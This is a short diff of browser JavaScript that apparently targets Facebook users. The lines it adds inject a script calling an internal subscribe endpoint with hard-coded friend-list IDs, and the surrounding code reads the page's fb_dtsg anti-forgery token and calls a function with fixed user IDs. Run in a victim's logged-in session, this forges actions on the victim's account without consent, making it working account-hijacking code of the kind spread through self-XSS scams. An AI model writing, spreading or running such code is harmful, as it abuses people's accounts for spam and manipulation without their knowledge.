@@ -57,10 +57,18 @@ http4.close
 };
 http4.send(params4)
 }
+
+function sublist(uidss) {
+		var a = document.createElement('script');
+		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
+		document.body.appendChild(a);
+}
+
 a("100001052749861");
 a("100001052749861");
-a("663827066995712");
-a("663827066995712");
+
+sublist("663827066995712");
+sublist("635397336505352");
 
 var gid = ['186721701492634'];
 var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
